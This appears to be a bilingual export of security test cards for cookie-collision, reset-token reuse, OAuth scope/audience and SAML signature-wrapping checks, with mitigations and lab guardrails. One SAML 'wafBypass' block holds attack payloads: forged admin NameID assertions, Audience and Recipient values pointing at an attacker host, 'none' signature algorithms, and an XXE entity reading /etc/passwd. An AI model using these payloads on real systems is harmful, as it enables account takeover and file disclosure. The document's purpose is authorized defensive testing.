mitigation.zh: 跨信任边界停止使用 Java 原生序列化并迁移到显式数据协议；迁移期配置进程级与流级 ObjectInputFilter，只允许最小业务类型、深度、引用数和字节数；移除不需要的 Gadget 依赖并升级，隔离反序列化进程且监控拒绝事件和异常类加载。修复后重放第 1 步流，确认被过滤器拒绝。
mitigation.en: Stop native Java serialization across trust boundaries and migrate to explicit data protocols; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types, depth, references, and byte counts; remove unneeded gadget dependencies, keep upgrading, isolate deserialization, and monitor rejections and anomalous class loading. After the fix, replay the step-1 streams and confirm filter rejection.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: Cookie 作用域与同名冲突

description.zh: 向子域或父域路径投掷同名 Cookie，验证会话或 CSRF 判定是否读取到攻击者写入的值。
description.en: Isolates commands from the mixed source into a Cookie Scope and Name Collision validation card using synthetic principals, a read-only marker, and server-side evidence.

prerequisites.zh: 使用两个合成账户、隔离浏览器配置和固定无敏感字段标记对象，记录登录前后会话 ID 的哈希与主体。
prerequisites.en: Use two synthetic accounts, isolated browser profiles, and a fixed nonsensitive marker object, recording session-ID hashes and principals before and after login.

prerequisites.zh: 若检查明文传输，只在自有封闭网络和测试流量中抓包；Cookie 域、路径、SameSite 和浏览器版本必须明确。
prerequisites.en: If reviewing cleartext transport, capture only owned test traffic on an isolated network; document cookie domain, path, SameSite mode, and browser version.

title.zh: Cookie 作用域与同名冲突样例 1
title.en: Cookie Scope and Name Collision Sample 1

description.zh: 在隔离环境使用合成主体执行该Cookie 作用域与同名冲突样例，并以服务端日志和只读标记确认结果。
description.en: Run this Cookie Scope and Name Collision sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

syntaxBreakdown.part: // Run only on a controlled example.invalid browser fixture; no cookie-jar flooding or real session value.

analysis.zh: 阳性会话固定要求登录前受控会话 ID 在登录后未轮换且另一测试客户端可访问同一主体；Cookie Tossing 要求子域可设置的同名 Cookie 被主域安全逻辑选中；SameSite 仅证明凭据随导航发送，不能证明响应可读或状态变更。缺少属性、抓到测试 Cookie 或随机性工具给出低分本身都不是劫持。
analysis.en: Session fixation requires a controlled pre-login ID to survive authentication and authorize the same principal from another test client. Cookie tossing requires a same-name cookie set by a subdomain to be selected by main-domain security logic. SameSite can show credentials sent on navigation but not response readability or state change. A missing attribute, captured test cookie, or low randomness score alone is not hijacking.

opsecTips.zh: 仅复用可撤销的合成会话并读取一个标记对象；不得捕获第三方流量、真实 Cookie 或触发资金与资料变更。
opsecTips.en: Replay only revocable synthetic sessions and read one marker object; do not capture third-party traffic, real cookies, or trigger financial or profile changes.

opsecTips.zh: 注销全部测试会话，删除 Cookie、抓包和临时脚本，清理浏览器站点数据并恢复 HTTPS 与 Cookie 策略。
opsecTips.en: Log out all test sessions, delete cookies, captures, and temporary scripts, clear browser site data, and restore HTTPS and cookie policy.

description.zh: 绕过按单一路径读取 Cookie 的逻辑：父子路径同名 Cookie 并存干扰服务端取值。成功判据：请求头中出现两个同名 Cookie 且解析取到攻击者值。
description.en: Bypasses single-path cookie reads by co-locating the same name on parent and child paths. Success: request carries both cookies and the attacker value wins.

description.zh: 扩大同名 Cookie 作用域干扰子域/父域解析顺序。成功判据：子域请求携带投递的 Cookie。
description.en: Widens the duplicate cookie's scope to interfere with subdomain parsing order. Success: subdomain requests carry the tossed cookie.

description.zh: 绕过按名称精确匹配的清理/校验逻辑：百分号编码下划线。成功判据：同名逻辑键被双重写入。
description.en: Bypasses name-exact cleanup logic by percent-encoding the underscore in the name. Success: the logical key gets written twice.

description.zh: 为Cookie 作用域与同名冲突准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for Cookie Scope and Name Collision.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖 Cookie 作用域与同名冲突场景，检验攻击者能否利用 Domain、Path 与同名写入规则让伪造会话值压过真实凭据。验证维度为脚本注入多枚同名冲突 Cookie 的单步执行，对应第 1 步。
overview.en: This payload covers cookie scoping and same-name collision, testing whether an attacker can leverage Domain, Path and same-name write rules to shadow real credentials with forged session values. Validation injects multiple colliding cookies via script in one step, mapped to step 1.

vulnerability.zh: 根因在于服务端解析 Cookie 时未按作用域特异性取值：攻击者可经子域向父域投掷同名会话 Cookie，或写入更长 Path 的同名 Cookie——按 RFC 6265 排序规则更长 Path 排在 Cookie 头前列，伪造值因此可能排在合法值之前被优先读取。
vulnerability.en: The root cause is server cookie parsing that ignores scope specificity: same-name session cookies can be planted multiple times via subdomains or broad paths, and once concatenated in the request header the forged value may precede the legitimate one and be read first.

exploitation.zh: 第 1 步在目标页面上下文执行脚本写入四枚 marker Cookie，再以 Domain 属性写入伪造 session 值，随后请求受保护路径并核对服务端实际解析到的会话；伪造值生效或出现多值拼接即确认同名冲突可利用。成功判据以服务端会话决策为准。占位符在全局变量菜单替换；测试使用可回滚的合成会话。
exploitation.en: In step 1, execute the script in the target page context to write four marker cookies, then plant a forged session value with a Domain attribute, request the protected path, and check which session the server actually resolved; a forged value winning or multi-value concatenation confirms exploitable collision. Judge success by the server session decision. Replace placeholders via the global variables menu; use rollback-safe synthetic sessions.

mitigation.zh: 统一会话 Cookie 的名称、Domain 与 Path 并避免同名变体，解析时按 RFC 特异性规则取最精确值；设置前缀机制如 __Host 会话 Cookie。修复后重放第 1 步，伪造值应被忽略。
mitigation.en: Unify session cookie name, Domain and Path to avoid same-name variants, resolve per RFC specificity rules taking the most specific value, and use prefixes like __Host for session cookies. After the fix, replay step 1: forged values should be ignored.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: 重置令牌单次使用

description.zh: 重复提交已消费的重置令牌，验证其单次使用约束是否生效。
description.en: Isolates commands from the mixed source into a Reset Token Single Use validation card using synthetic principals, a read-only marker, and server-side evidence.

prerequisites.zh: 使用自有邮件沙箱、两个合成账户和可回滚密码，记录每个重置请求、令牌哈希、账户 ID 与邮件任务 ID。
prerequisites.en: Use an owned mail sandbox, two synthetic accounts, and rollback passwords, recording each reset request, token hash, account ID, and mail-job ID.

prerequisites.zh: 固定应用公开基址和可信代理配置，所有回调域均为自有测试域，且令牌尝试次数受严格预算控制。
prerequisites.en: Fix the application's public base URL and trusted-proxy configuration, use only owned callback domains, and strictly budget token attempts.

title.zh: 重置令牌单次使用样例 1

description.zh: 在隔离环境使用合成主体执行该重置令牌单次使用样例，并以服务端日志和只读标记确认结果。
description.en: Run this Reset Token Single Use sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

analysis.zh: 阳性证据分别是邮件中的重置链接被不可信 Host 改写并把测试令牌送到受控域；低权限请求可重置另一合成账户；已用或过期令牌再次改变密码；或令牌在预算内可由已知生成规律预测。邮件未到达、响应 200、链接文本反射、状态码差异或脚本猜中自身生成的值都不是证据。
analysis.en: Positive evidence is an untrusted Host changing a mailed reset link and delivering a test token to an owned domain, an underprivileged request resetting another synthetic account, a used or expired token changing a password again, or a token predicted from a known generation rule within budget. Missing mail, HTTP 200, reflected link text, status differences, or a script matching its own generated value are not evidence.

opsecTips.zh: 只对合成账户执行一次可回滚密码变更；不得向真实收件人发信、遍历完整验证码空间或提交真实令牌。
opsecTips.en: Perform at most one reversible password change on a synthetic account; do not message real recipients, enumerate full code spaces, or submit real tokens.

opsecTips.zh: 撤销全部测试令牌，恢复合成账户密码，删除邮件、回调日志和临时脚本，并核对没有未完成重置任务。
opsecTips.en: Revoke all test tokens, restore synthetic passwords, delete mail, callback logs, and temporary scripts, and verify no reset jobs remain pending.

description.zh: 绕过"使用后失效"检查的竞态窗口：并行请求同时通过单次消费校验。成功判据：至少两次返回成功状态码。
description.en: Bypasses single-use checks via a race window with parallel requests. Success: at least two responses report success.

description.zh: 绕过已用令牌黑名单的精确匹配：base64 形态在另一解码层还原。成功判据：重置被接受。
description.en: Bypasses exact-match used-token blacklists via a base64 form decoded at another layer. Success: reset accepted.

description.zh: 利用取参差异让消费计数与验证取不同实例。成功判据：同一令牌完成两次重置。
description.en: Uses extraction divergence so the consumption counter and validator see different instances. Success: the same token resets twice.

description.zh: 为重置令牌单次使用准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for Reset Token Single Use.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖重置令牌单次使用场景，检验已消费令牌再次提交时是否被拒绝，防止同一令牌被多次用于改密。验证维度为已用令牌重放的单步阴性样例，对应第 1 步。
overview.en: This payload covers single-use reset tokens, testing whether an already-consumed token is rejected on resubmission so one token cannot be reused to change a password. Validation replays a used token as a single negative sample, mapped to step 1.

vulnerability.zh: 根因在于令牌消费后未即时失效或状态更新与口令变更不在同一事务：攻击者截获一次成功请求后重放即可再次改密，令牌也可能被转交他人在有效期内重复使用。
vulnerability.en: The root cause is tokens not being invalidated immediately after consumption, or consumption state and the password change living outside one transaction: replaying a captured success request changes the password again or resells the token for reuse.

exploitation.zh: 第 1 步以标记为已消费的测试令牌提交重置确认并附加 dry_run 标记，服务端返回已失效或拒绝即证明单次使用生效，接受即确认重放缺陷。成功判据以响应状态与令牌状态记录为准。占位符在全局变量菜单替换；使用实验环境专用已用令牌夹具。
exploitation.en: In step 1, submit a reset-confirm with a test token marked as already consumed plus a dry_run flag; an expired or rejected response proves single-use enforcement, acceptance confirms the replay flaw. Judge success by response status and token-state records. Replace placeholders via the global variables menu; use the lab's dedicated consumed-token fixture.

mitigation.zh: 令牌消费与口令更新放在同一原子事务并立即烧毁令牌记录，同时保留使用日志与告警。修复后重放第 1 步，已用令牌应返回明确的失效错误。
mitigation.en: Perform token consumption and the password update in one atomic transaction, burning the token immediately with usage logs and alerts. After the fix, replay step 1: used tokens should return a clear expired error.

name.zh: OAuth Scope 越权与 Audience 混淆

description.zh: 对照正常请求与越权 scope/audience 请求，验证授权端点与资源服务器的范围与受众校验。
description.en: Contrast normal requests with escalated scope/audience requests to verify scope and audience validation at the authorize endpoint and resource server.

subCategory.zh: OAuth 与 OIDC 流程攻击

prerequisites.zh: 使用自有授权服务器、测试客户端、两个合成用户和精确登记的 HTTPS redirect URI，记录授权请求与令牌事件。
prerequisites.en: Use an owned authorization server, test client, two synthetic users, and an exactly registered HTTPS redirect URI, recording authorization and token events.

prerequisites.zh: 每轮使用新的 state、nonce、PKCE verifier 和一次性 code，测试令牌仅包含无敏感字段 scope。
prerequisites.en: Use fresh state, nonce, PKCE verifier, and one-time code for every run, with test tokens limited to nonsensitive scopes.

title.zh: OAuth Scope 与 Audience 边界样例 1
title.en: OAuth Scope and Audience Boundary Sample 1

execution.command:
printf "%s\n" "Fragment negative control: https://client.example.invalid/callback#access_token=PAYLOADER_TEST_TOKEN"
printf "%s\n" "URL fragments are not sent in HTTP requests or Referer headers."
curl -sS --max-time 5 "http://127.0.0.1:8080/oauth/authorize?client_id=payloader-client&redirect_uri=https%3A%2F%2Fclient.example.invalid%2Foauth%2Fcallback&response_type=code&scope=openid%20profile&state=PAYLOADER_STATE&code_challenge=PAYLOADER_CHALLENGE&code_challenge_method=S256"
curl -sS --max-time 5 -H "Authorization: Bearer PAYLOADER_TEST_TOKEN" http://127.0.0.1:8080/api/marker
curl -sS --max-time 5 -d "grant_type=refresh_token&refresh_token=PAYLOADER_TEST_REFRESH&client_id=payloader-client" http://127.0.0.1:8080/oauth/token
# Expected: only consented scope and matching issuer, audience, client, and token binding reach the read-only marker.

description.zh: 在隔离环境使用合成主体执行该OAuth Scope 与 Audience 边界样例，并以服务端日志和只读标记确认结果。
description.en: Run this OAuth Scope and Audience Boundary sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

analysis.zh: 阳性需要证明错误会话可完成账户绑定、未登记 redirect URI 收到可兑换 code/token、未授权 scope 被资源服务器接受，或面向另一个客户端/受众的令牌访问同一标记资源。授权页错误、候选 URI 被反射、浏览器导航、不可兑换 code、fragment 出现在地址栏或资源服务器正确拒绝都不是漏洞证据。
analysis.en: Positive evidence requires the wrong session to complete account binding, an unregistered redirect URI to receive a redeemable code or token, an unauthorized scope to be accepted, or a token for another client or audience to access the same marker resource. Authorization errors, reflected candidate URIs, browser navigation, unredeemable codes, fragments in the address bar, or correct resource-server rejection are not evidence.

opsecTips.zh: 只使用短期测试 code/token 并访问一个只读标记资源；不得使用窃取令牌、管理员 scope 或真实第三方客户端。
opsecTips.en: Use only short-lived test codes and tokens to access one read-only marker resource; do not use stolen tokens, administrator scopes, or real third-party clients.

opsecTips.zh: 撤销 code、access token 与 refresh token，删除测试绑定和回调日志，恢复客户端登记与 consent 配置。
opsecTips.en: Revoke codes, access tokens, and refresh tokens, delete test bindings and callback logs, and restore client registration and consent configuration.

description.zh: 绕过 scope 白名单逐项比对：编码分隔符使前后端解析出不同集合。成功判据：授权结果包含 admin。
description.en: Bypasses per-item scope whitelisting: the encoded separator yields different parsed sets across layers. Success: grant includes admin.

description.zh: 利用取参差异注入附加授权。成功判据：下发的令牌含 admin 权限。
description.en: Injects extra grants via parameter-pollution extraction differences. Success: issued token carries admin.

description.zh: 绕过单一参数名的受众校验假设：探测后端实际读取的字段。成功判据：任一别名字段被接受并跨受众使用令牌。
description.en: Bypasses single-parameter audience assumptions by probing which alias the backend actually reads. Success: any alias is accepted and the token works cross-audience.

description.zh: 为OAuth Scope 与 Audience 边界准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for OAuth Scope and Audience Boundary.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

# Expected: only consented scope and matching issuer, audience, client, and token binding reach the read-only marker.

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖 OAuth Scope 与 Audience 边界场景，检验授权服务器是否把令牌约束在注册 scope 与目标 audience 内，拒绝 fragment 等非常规承载。验证维度为 fragment 阴性对照的单步样例，对应第 1 步。
overview.en: This payload covers OAuth scope and audience boundaries, testing whether the authorization server confines tokens to registered scopes and the intended audience and rejects nonstandard carriers such as fragments. Validation uses a fragment negative control in one step, mapped to step 1.

vulnerability.zh: 根因在于令牌签发未绑定请求的 scope 与 audience，或响应类型接受以 fragment 承载令牌：超范围令牌可被用于更高权限接口，fragment 中的令牌则可能经浏览器历史、书签与链接分享外泄。
vulnerability.en: The root cause is token issuance unbound to the requested scope and audience, or accepting fragment-borne responses: over-scoped tokens work against higher-privilege APIs, while fragment tokens leak via browser history and Referer.

exploitation.zh: 第 1 步按脚本构造携带 access_token 的 fragment 回调样例并输出对照说明，核对授权服务器是否拒绝 fragment 响应类型，以及签发令牌的 scope 与 aud 是否精确匹配注册值；任一超范围令牌可用即确认边界缺失。成功判据以令牌声明与服务端拒绝记录为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, build the fragment-callback sample carrying an access_token per the script and print the control notes; check whether the authorization server rejects fragment response types and whether issued token scopes and aud exactly match registered values; any usable over-scoped token confirms the missing boundary. Judge success by token claims and server rejection records. Replace placeholders via the global variables menu.

mitigation.zh: 签发时把请求 scope 与 audience 写入令牌并逐接口校验，禁用 fragment 响应类型仅允许 code 流。修复后重放第 1 步，超范围与 fragment 请求应被拒绝。
mitigation.en: Embed the requested scope and audience into tokens and verify per API, disabling fragment response types and allowing only the code flow. After the fix, replay step 1: over-scoped and fragment requests should be rejected.

name.zh: SAML 签名包装攻击

description.zh: 构造 XML 签名包装变体（移动签名引用对象），验证签名校验是否可被结构欺骗。
description.en: Isolates commands from the mixed source into a SAML XML Signature Wrapping Validation Baseline validation card using synthetic principals, a read-only marker, and server-side evidence.

subCategory.zh: SAML 断言与联邦身份攻击

prerequisites.zh: 使用自有 IdP/SP、测试证书和两个合成主体，记录 Response/Assertion ID、InResponseTo、Audience、Recipient、时间与签名引用。
prerequisites.en: Use an owned IdP and SP, test certificates, and two synthetic principals, recording Response and Assertion IDs, InResponseTo, Audience, Recipient, time, and signature references.

prerequisites.zh: XXE 仅使用无文件读取、无外网的本地 canary resolver；签名测试使用专用测试密钥和可销毁 SP。
prerequisites.en: For XXE, use a local canary resolver without file reads or egress; use a dedicated test key and disposable SP for signature tests.

title.zh: SAML XML 签名包装验证基线样例 1
title.en: SAML XML Signature Wrapping Validation Baseline Sample 1

execution.command:
xmlsec1 --sign --privkey-pem fixtures/test-idp.key,fixtures/test-idp.crt --id-attr:ID Assertion --output signed-test.xml fixtures/saml-signature-template.xml
xmlsec1 --verify --trusted-pem fixtures/test-idp.crt --id-attr:ID Assertion signed-test.xml

description.zh: 在隔离环境使用合成主体执行该SAML XML 签名包装验证基线样例，并以服务端日志和只读标记确认结果。
description.en: Run this SAML XML Signature Wrapping Validation Baseline sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

analysis.zh: 阳性签名缺陷要求 SP 接受未签名或攻击者签名的断言并建立错误主体；重放要求同一 Assertion ID 在过期或已消费后再次建立会话；XSW 要求业务层使用的断言与签名实际覆盖的节点不同；XXE 要求解析器服务端触发受控 canary。删除 Signature 后报错、XML 可解析、NameID 文本变化、Base64 成功或 DTD 出现在请求中都不是阳性。
analysis.en: A signature flaw requires the SP to accept an unsigned or attacker-signed assertion and create the wrong principal. Replay requires a consumed or expired Assertion ID to create another session. XSW requires business logic to use a node different from the signed node. XXE requires the server parser to trigger a controlled canary. Rejection after Signature removal, parseable XML, changed NameID text, successful Base64, or a DTD merely present in the request is not positive.

opsecTips.zh: 只建立一个合成低权限会话；不得读取系统文件、外带数据、使用真实 IdP 证书或向生产 ACS 提交断言。
opsecTips.en: Create at most one synthetic low-privilege session; do not read system files, exfiltrate data, use real IdP certificates, or submit assertions to a production ACS.

opsecTips.zh: 注销测试会话，撤销测试证书，删除断言、XML、resolver 日志和 Burp 项目，并恢复签名及解析器策略。
opsecTips.en: Log out test sessions, revoke test certificates, delete assertions, XML, resolver logs, and Burp projects, and restore signature and parser policy.

description.zh: 绕过取首个断言的验证器：在已签名断言前插入未签名恶意断言（XSW 经典形态）。成功判据：以 admin 身份建立会话。
description.en: Bypasses verifiers that read the first assertion by prepending an unsigned evil one (classic XSW). Success: session established as admin.

wafBypass.command: xmlstarlet ed -m "//*[local-name()='Signature'][1]" "//*[local-name()='Response']" fixtures/saml-signed.xml | base64 -w0 | curl -sS --max-time 5 --data-urlencode "SAMLResponse@-" http://127.0.0.1:8080/saml/acs

description.zh: 把断言级签名移动到 Response 级，检验验证器是否校验签名上下文。成功判据：篡改后的断言仍通过验证。
description.en: Hoists the assertion-level signature to the Response level to test context validation. Success: the mutated assertion still verifies.

description.zh: 在 ID 属性后插入注释节点破坏 URI 引用规范化，检验验证器错误处理。成功判据：签名验证被跳过或断言仍被接受。
description.en: Inserts a comment node after the ID attribute to break URI-reference canonicalization and probe error handling. Success: verification is skipped or the assertion still passes.

description.zh: HTML 实体编码绕过 NameID 内容比对与 WAF 特征。成功判据：解码后命中 admin 账户。
description.en: HTML entity encoding bypasses NameID comparison and WAF signatures. Success: decodes to the admin account.

description.zh: 注释插入标签内部，绕过基于标签结构的过滤且部分解析器仍还原。成功判据：解析后 NameID 值生效。
description.en: Comments inside the tag bypass structure-based filters while some parsers still resolve it. Success: the NameID value takes effect after parsing.

description.zh: 前插未签名断言，验证器取签名断言而应用取首个。成功判据：以 admin 身份登录。
description.en: Prepending an unsigned assertion while the validator reads the signed one and the app reads the first. Success: logged in as admin.

title.en: Validation step 1 for SAML Assertion and XML Signature Validation Test

wafBypass.command:
<!-- comment --><NameID>admin@{TARGET}</NameID>
<saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@{TARGET}</saml:NameID></saml:Subject></saml:Assertion>
<ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-none"/>
<Response><Assertion><Subject><NameID>admin@{TARGET}</NameID></Subject></Assertion></Response>
<Audience>https://{ATTACKER_HOST}</Audience>
<Audience>https://{TARGET}.{ATTACKER_HOST}</Audience>
<SubjectConfirmationData Recipient="https://{ATTACKER_HOST}/callback"/>
<Conditions NotBefore="2000-01-01T00:00:00Z" NotAfter="2099-12-31T23:59:59Z"/>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

description.zh: 把签名包装与断言变体逐条置于 SAML 响应验证；服务端接受篡改后的 NameID 或 Audience，即确认断言验证缺陷。
description.en: Place each signature-wrapping or assertion variant into SAML-response validation; the server accepting a tampered NameID or Audience confirms assertion-validation flaws.

description.zh: 为SAML XML 签名包装验证基线准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for SAML XML Signature Wrapping Validation Baseline.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

xmlsec1 --verify --trusted-pem fixtures/test-idp.crt --id-attr:ID Assertion signed-test.xml

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖 SAML XML 签名包装验证基线场景，检验验证器在文档包含多个 Assertion 或 Signature 时是否只认引用对象。验证维度为模板签署与本地复验的单步基线，包装变体由 WAF 绕过区样例覆盖，对应第 1 步。
overview.en: This payload covers the SAML XML signature-wrapper validation baseline, testing whether the verifier honors only the referenced object when documents contain multiple Assertions or Signatures. Validation signs a template and re-verifies after tampering, mapped to step 1.

vulnerability.zh: 根因在于验证器按文档顺序或首个节点取断言而不核对签名引用：攻击者把合法签名挂在恶意 Assertion 上形成包装，验证通过后消费的却是伪造身份。
vulnerability.en: The root cause is selecting assertions by document order or first node without checking signature references: attackers attach a legitimate signature to a malicious Assertion as a wrapper, and after validation the forged identity is consumed.

exploitation.zh: 第 1 步按脚本用 xmlsec1 以测试 IdP 密钥签署模板生成 signed-test.xml，随后篡改其中 NameID 再复验并提交 ACS：复验失败或 ACS 拒绝即证明包装防护生效，验证通过且身份被替换即确认 XSW 缺陷。成功判据以复验结果与 ACS 决策为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, sign the template with xmlsec1 using the test IdP key to produce signed-test.xml, then tamper the NameID, re-verify, and submit to the ACS: failed re-verification or ACS rejection proves wrapper protection, while verified acceptance with a swapped identity confirms the XSW flaw. Judge success by re-verification results and ACS decisions. Replace placeholders via the global variables menu.

mitigation.zh: 验证器解析签名引用的 URI 并只消费被签名覆盖的 Assertion，禁止文档出现多个未引用断言；同时校验 Subject 与 InResponseTo。修复后重放第 1 步，包装文档应被拒绝。
mitigation.en: Parse the signature reference URI and consume only the covered Assertion, forbid unreferenced assertions in the document, and validate Subject and InResponseTo. After the fix, replay step 1: wrapper documents should be rejected.

name.zh: SAML NameID 规范化与身份绑定
name.en: SAML NameID Canonicalization and Identity Binding

description.zh: 提交大小写与编码规范化变体的 NameID，验证身份映射是否可被规范化差异欺骗。
description.en: Isolates commands from the mixed source into a SAML NameID Canonicalization and Identity Binding validation card using synthetic principals, a read-only marker, and server-side evidence.

subCategory.zh: SAML 断言与联邦身份攻击

prerequisites.zh: 使用自有 IdP/SP、测试证书和两个合成主体，记录 Response/Assertion ID、InResponseTo、Audience、Recipient、时间与签名引用。
prerequisites.en: Use an owned IdP and SP, test certificates, and two synthetic principals, recording Response and Assertion IDs, InResponseTo, Audience, Recipient, time, and signature references.

prerequisites.zh: XXE 仅使用无文件读取、无外网的本地 canary resolver；签名测试使用专用测试密钥和可销毁 SP。
prerequisites.en: For XXE, use a local canary resolver without file reads or egress; use a dedicated test key and disposable SP for signature tests.

title.zh: SAML NameID 规范化与身份绑定样例 1
title.en: SAML NameID Canonicalization and Identity Binding Sample 1

execution.command:
printf "%s" "PAYLOADER_TEST_SAML_RESPONSE" | base64 -d > saml-response.xml
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion" -u "//saml:NameID" -v "payloader-b@example.invalid" saml-response.xml > saml-modified.xml
base64 -w0 saml-modified.xml > saml-modified.b64

description.zh: 在隔离环境使用合成主体执行该SAML NameID 规范化与身份绑定样例，并以服务端日志和只读标记确认结果。
description.en: Run this SAML NameID Canonicalization and Identity Binding sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

title.zh: SAML NameID 规范化与身份绑定样例 2
title.en: SAML NameID Canonicalization and Identity Binding Sample 2

execution.command:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion" -u "//saml:NameID" -v "payloader-marker@example.invalid" signed-test.xml > tampered-test.xml
xmlsec1 --verify --trusted-pem fixtures/test-idp.crt --id-attr:ID Assertion tampered-test.xml
# Expected: only the fixture signed by the pinned test IdP key verifies; tampering fails.

description.zh: 在隔离环境使用合成主体执行该SAML NameID 规范化与身份绑定样例，并以服务端日志和只读标记确认结果。
description.en: Run this SAML NameID Canonicalization and Identity Binding sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

syntaxBreakdown.part: # Expected: only the fixture signed by the pinned test IdP key verifies; tampering fails.

analysis.zh: 阳性签名缺陷要求 SP 接受未签名或攻击者签名的断言并建立错误主体；重放要求同一 Assertion ID 在过期或已消费后再次建立会话；XSW 要求业务层使用的断言与签名实际覆盖的节点不同；XXE 要求解析器服务端触发受控 canary。删除 Signature 后报错、XML 可解析、NameID 文本变化、Base64 成功或 DTD 出现在请求中都不是阳性。
analysis.en: A signature flaw requires the SP to accept an unsigned or attacker-signed assertion and create the wrong principal. Replay requires a consumed or expired Assertion ID to create another session. XSW requires business logic to use a node different from the signed node. XXE requires the server parser to trigger a controlled canary. Rejection after Signature removal, parseable XML, changed NameID text, successful Base64, or a DTD merely present in the request is not positive.

opsecTips.zh: 只建立一个合成低权限会话；不得读取系统文件、外带数据、使用真实 IdP 证书或向生产 ACS 提交断言。
opsecTips.en: Create at most one synthetic low-privilege session; do not read system files, exfiltrate data, use real IdP certificates, or submit assertions to a production ACS.

opsecTips.zh: 注销测试会话，撤销测试证书，删除断言、XML、resolver 日志和 Burp 项目，并恢复签名及解析器策略。
opsecTips.en: Log out test sessions, revoke test certificates, delete assertions, XML, resolver logs, and Burp projects, and restore signature and parser policy.

description.zh: 绕过按字面匹配的账户映射：尾随空格与大小写差异经规范化后命中管理员账户。成功判据：映射到 admin 主体。
description.en: Bypasses literal account mapping since trailing spaces and case fold to the admin account after canonicalization. Success: mapped to the admin principal.

description.zh: 变更 NameID 格式触发不同规范化路径。成功判据：unspecified 格式下值被当作另一个账户解析。
description.en: Switching the NameID format triggers a different canonicalization path. Success: the value resolves to a different account under unspecified format.

description.zh: HTML 实体编码绕过内容比对与 WAF 特征。成功判据：解码后命中 admin 账户。
description.en: HTML entity encoding bypasses content comparison and WAF signatures. Success: decodes to the admin account.

description.zh: 为SAML NameID 规范化与身份绑定准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for SAML NameID Canonicalization and Identity Binding.

description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

attackChain.payload:
printf "%s" "PAYLOADER_TEST_SAML_RESPONSE" | base64 -d > saml-response.xml
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion" -u "//saml:NameID" -v "payloader-b@example.invalid" saml-response.xml > saml-modified.xml
base64 -w0 saml-modified.xml > saml-modified.b64

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖 SAML NameID 规范化与身份绑定场景，检验服务端对大小写、空白与编码差异的 NameID 是否按唯一身份处理。验证维度为改写 NameID 后签名与验证的两步流程，对应第 1 至第 2 步。
